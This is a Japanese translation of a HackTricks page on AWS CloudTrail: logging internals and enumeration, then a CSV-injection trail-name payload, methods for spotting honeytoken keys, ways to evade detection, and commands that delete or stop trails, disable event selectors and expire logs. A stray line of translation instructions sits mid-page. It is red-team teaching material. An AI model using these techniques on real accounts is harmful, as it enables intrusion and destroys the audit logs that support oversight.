# AWS - CloudTrail Enum

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## **CloudTrail**

AWS CloudTrailは**AWS環境内のアクティビティを記録および監視**します。AWSリソースとのすべてのやり取りについて、誰が何をいつどこから行ったかを含む詳細な**イベントログ**をキャプチャします。これにより、変更とアクションの監査トレイルが提供され、セキュリティ分析、コンプライアンス監査、リソース変更の追跡が支援されます。CloudTrailは、ユーザーとリソースの動作を理解し、セキュリティポジションを向上させ、規制の遵守を確保するために不可欠です。

各記録されたイベントには次の情報が含まれます：

- 呼び出されたAPIの名前：`eventName`
- 呼び出されたサービス：`eventSource`
- 時刻：`eventTime`
- IPアドレス：`SourceIPAddress`
- エージェントメソッド：`userAgent`。例：
  - Signing.amazonaws.com - AWS Management Consoleから
  - console.amazonaws.com - アカウントのルートユーザー
  - lambda.amazonaws.com - AWS Lambda
- リクエストパラメータ：`requestParameters`
- レスポンス要素：`responseElements`

イベントは**約5分ごとにJSONファイルに記録**され、CloudTrailによって保持され、最終的にログファイルは**約15分後にS3に配信されます**。\
CloudTrailのログは**アカウント間およびリージョン間で集約**できます。\
CloudTrailは、ログファイルの整合性を使用して、CloudTrailがそれらを配信した後もログファイルが変更されていないことを検証できるようにします。ログ内のSHA-256ハッシュをダイジェストファイルに作成します。新しいログのsha-256ハッシュは1時間ごとに作成されます。\
Trailを作成する際、イベントセレクターを使用して、ログを記録するトレイルを示すことができます：管理、データ、またはインサイトイベント。

ログはS3バケットに保存されます。デフォルトではServer Side Encryption（SSE-S3）が使用されるため、AWSはアクセス権を持つ人々のためにコンテンツを復号化しますが、追加のセキュリティとしてSSE with KMSと独自のキーを使用できます。

ログは**次の名前形式のS3バケットに保存されます**：

- **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
- BucketNameが次のようになります：**`aws-cloudtrail-logs-<accountid>-<random>`**
- 例：**`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

各フォルダ内の各ログは、次の形式に従う**名前を持ちます**：**`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

ログファイルの命名規則

![](<../../../../.gitbook/assets/image (122).png>)

さらに、**ファイルの整合性を確認するためのダイジェストファイル**は、**同じバケット内**にあります：

![](<../../../../.gitbook/assets/image (195).png>)

### 複数のアカウントからのログの集約

- ログファイルを配信するAWSアカウントでトライアルを作成します
- CloudTrailのクロスアカウントアクセスを許可し、CloudTrailおよび必要なAWSアカウントごとにアクセスを許可するための宛先S3バケットにアクセス許可を適用します
- 他のAWSアカウントで新しいトレイルを作成し、ステップ1で作成したバケットを使用するように選択します

ただし、すべてのログを同じS3バケットに保存できる場合でも、複数のアカウントからのCloudTrailログを1つのAWSアカウントに属するCloudWatch Logsに集約することはできません。

{% hint style="danger" %}
アカウントには、CloudTrailから**有効になっているさまざまなトレイル**があることを覚えておいてください。これにより、同じログ（または異なるログ）を異なるバケットに保存できます。
{% endhint %}

### 組織内のすべてのアカウントから1つにCloudtrailを作成

CloudTrailを作成する際、組織内のすべてのアカウントにCloudTrailをアクティブにするよう指示し、ログを1つのバケットに取得することが可能です：

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

この方法で、すべてのリージョンのすべてのアカウントでCloudTrailを簡単に構成し、ログを1つのアカウントに集約できます（保護する必要があります）。 

### ログファイルの確認

ログが変更されていないことを確認するには、次のコマンドを実行できます

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatchへのログ

**CloudTrailは自動的にログをCloudWatchに送信できるため、不審なアクティビティが行われた際に警告を設定できます。**\
CloudTrailがログをCloudWatchに送信するためには、そのアクションを許可する**ロール**を作成する必要があります。可能であれば、これらのアクションを実行するためにAWSデフォルトのロールを使用することが推奨されています。このロールにより、CloudTrailが以下のアクションを実行できます:

* CreateLogStream: CloudWatch Logsログストリームを作成する
* PutLogEvents: CloudTrailログをCloudWatch Logsログストリームに配信する

### イベント履歴

CloudTrailイベント履歴を使用すると、記録されたログをテーブルで確認できます:

![](<../../../../.gitbook/assets/image (89).png>)

### インサイト

**CloudTrail Insights**は、CloudTrailトレイルからの書き込み管理イベントを自動的に**分析**し、**異常なアクティビティ**に**警告**します。たとえば、確立されたベースラインと異なる`TerminateInstance`イベントの増加がある場合、それをインサイトイベントとして表示します。これらのイベントにより、**異常なAPIアクティビティの検出と対応がこれまで以上に容易**になります。

これらのインサイトは、CloudTrailログと同じバケットに保存されます: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### セキュリティ

| CloudTrailログファイルの整合性 | <ul><li>ログが改ざんされていないかを検証します</li><li><p>ダイジェストファイルを使用します (各ファイルにハッシュを作成)</p><ul><li>SHA-256ハッシング</li><li>SHA-256 with RSAによるデジタル署名</li><li>Amazonが所有する秘密鍵</li></ul></li><li>ダイジェストファイルの作成には1時間かかります (毎時実行)</li></ul> |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 不正なアクセスを停止する     | <ul><li><p>IAMポリシーとS3バケットポリシーを使用します</p><ul><li>セキュリティチーム —> 管理アクセス</li><li>監査人 —> 読み取り専用アクセス</li></ul></li><li>ログを暗号化するためにSSE-S3/SSE-KMSを使用します</li></ul>                                                                                                                                        |
| ログファイルの削除を防止する | <ul><li>IAMおよびバケットポリシーで削除アクセスを制限します</li><li>S3 MFA削除を構成します</li><li>ログファイル検証で検証します</li></ul>                                                                                                                                                                                            |

## アクセスアドバイザー

AWSアクセスアドバイザーは、最後の400日間のAWS **CloudTrailログを収集して洞察を得ます**。 CloudTrailは、AWSアカウントで行われたAWS API呼び出しと関連イベントの履歴をキャプチャします。アクセスアドバイザーは、このデータを利用して**サービスが最後にアクセスされた時期を表示**します。 CloudTrailログを分析することで、アクセスアドバイザーは、IAMユーザーまたはロールがアクセスしたAWSサービスとそのアクセスが発生した時期を特定できます。これにより、AWS管理者は、アクセスされていないサービスを特定し、実際の使用パターンに基づいて過剰な権限を削減する可能性があるため、**権限を洗練させる**ための情報を得ることができます。

{% hint style="success" %}
したがって、アクセスアドバイザーは、**ユーザーに与えられている不要な権限について通知**し、管理者がそれらを削除できるようにします
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## アクション

### 列挙
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV インジェクション**

CloudTrail内でCSVインジェクションを実行し、ログがCSV形式でエクスポートされExcelで開かれると任意のコードが実行される可能性があります。\
次のコードは、ペイロードを含む悪意のあるトレイル名を持つログエントリを生成します：
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
以下は、ハッキング技術に関する本の内容です。ファイルpentesting-cloud/aws-security/aws-services/aws-security-and-detection-services/aws-cloudtrail-enum.mdからの内容を日本語に翻訳して返します。翻訳では、同じマークダウンとHTML構文を保ち、コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'、pentesting、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の追加情報は入れないでください。  

詳細については、CSVインジェクションに関するページを確認してください：

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

この特定の技術に関する詳細については、[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)を確認してください。

## **検出のバイパス**

### ハニートークンの**バイパス**

ハニートークンは、**機密情報の持ち出しを検出**するために作成されます。AWSの場合、それらは**監視されているAWSキー**であり、そのキーで何かがトリガーされた場合、誰かがそのキーを盗んだということになります。

ただし、[**Canarytokens**](https://canarytokens.org/generate)**、[**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**、[**SpaceSiren**](https://github.com/spacesiren/spacesiren)などのハニートークンは、認識可能なアカウント名を使用するか、すべての顧客に同じAWSアカウントIDを使用します。したがって、Cloudtrailにログを作成せずにアカウント名と/またはアカウントIDを取得できれば、**そのキーがハニートークンかどうかを知ることができます**。

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)には、キーが[**Canarytokens**](https://canarytokens.org/generate)**、[**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**、[**SpaceSiren**](https://github.com/spacesiren/spacesiren)に属しているかどうかを検出するためのいくつかのルールがあります。

- もし**`canarytokens.org`**がロール名やアカウントIDに現れる場合、またはエラーメッセージに**`534261010715`**が現れる場合。
- より最近のテストでは、アカウント**`717712589309`**を使用しており、名前に**`canarytokens.com`**の文字列がまだ含まれています。
- もしエラーメッセージのロール名に**`SpaceCrab`**が現れる場合。
- **SpaceSiren**はユーザー名を生成するために**uuids**を使用します：`[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
- もし名前が**ランダムに生成されたように見える**場合、それがハニートークンである可能性が高いです。

#### キーIDからアカウントIDを取得

**アクセスキー**内の**エンコードされた**アカウントIDから**アカウントID**を取得し、Honeytokens AWSアカウントのリストとアカウントIDをチェックできます：[**こちらで説明されている**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
チェックしてください[**元の研究**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)。

#### ログを生成しない

これに対する最も効果的なテクニックは実際にはシンプルなものです。見つけた鍵を使用して、攻撃者のアカウント内のサービスにアクセスします。これにより、**CloudTrailは被害者のアカウントではなく、あなた自身のAWSアカウント内にログを生成**します。

出力には、アカウントIDとアカウント名を示すエラーが表示されるため、**それがHoneytokenかどうかを確認できます**。

#### ログを送信していないAWSサービス

過去には、**CloudTrailにログを送信していないAWSサービス**がいくつかありました（[こちらでリストを見つける](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。これらのサービスのいくつかは、認可されていない人（Honeytokenキー）がアクセスしようとすると、**エラーが含まれる** **キーロールのARN**を返します。

この方法で、**攻撃者はログをトリガーせずにキーのARNを取得**できます。ARNには**AWSアカウントIDと名前**が表示されるため、攻撃者はHoneyTokenの企業アカウントIDと名前を簡単に特定できます。これにより、攻撃者はトークンがHoneyTokenかどうかを特定できます。

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
公開APIがCloudTrailログを作成しないことが判明したすべてのAPIは修正されていますので、おそらく独自のものを見つける必要があるかもしれません...

詳細については、[**元の研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)をご確認ください。
{% endhint %}

### サードインフラストラクチャへのアクセス

特定のAWSサービスは**データベース**や**Kubernetes**クラスタ（EKS）などの**インフラストラクチャを生成**します。ユーザーがこれらのサービス（Kubernetes APIなど）に直接アクセスする場合、**AWS APIを使用しない**ため、CloudTrailはこの通信を検出できません。

したがって、EKSへのアクセス権を持つユーザーがEKS APIのURLを発見し、ローカルでトークンを生成し、**CloudTrailに検出されずにAPIサービスに直接アクセス**することができます。

詳細は次のとおりです：

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail構成の変更

#### トレイルの削除
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### トレイルの停止
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### マルチリージョンのロギングを無効にする

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### イベントセレクタによるロギングの無効化

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

最初の例では、単一のイベントセレクタが単一のオブジェクトとしてJSON配列で提供されています。`"ReadWriteType": "ReadOnly"` は、**イベントセレクタが読み取り専用イベントのみをキャプチャするように指定**されていることを示しています（つまり、CloudTrailインサイトは書き込みイベントをチェックしないでしょう）。

特定の要件に基づいてイベントセレクタをカスタマイズすることができます。

#### S3ライフサイクルポリシーを介したログの削除
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### バケット構成の変更

* S3バケットを削除する
* バケットポリシーを変更して、CloudTrailサービスからの書き込みを拒否する
* S3バケットにライフサイクルポリシーを追加してオブジェクトを削除する
* CloudTrailログを暗号化するために使用されているkmsキーを無効にする

### Cloudtrailランサムウェア

#### S3ランサムウェア

**非対称キーを生成**し、そのキーで**CloudTrailがデータを暗号化**し、**プライベートキーを削除**して、CloudTrailの内容を回復できないようにします。\
これは基本的には、以下で説明されている**S3-KMSランサムウェア**です:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMSランサムウェア**

これは、異なる権限要件で前述の攻撃を実行する最も簡単な方法です:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **参考文献**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
